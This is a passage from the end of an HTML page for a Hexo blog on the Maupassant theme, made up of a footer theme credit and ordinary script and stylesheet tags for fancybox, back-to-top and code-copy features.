Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
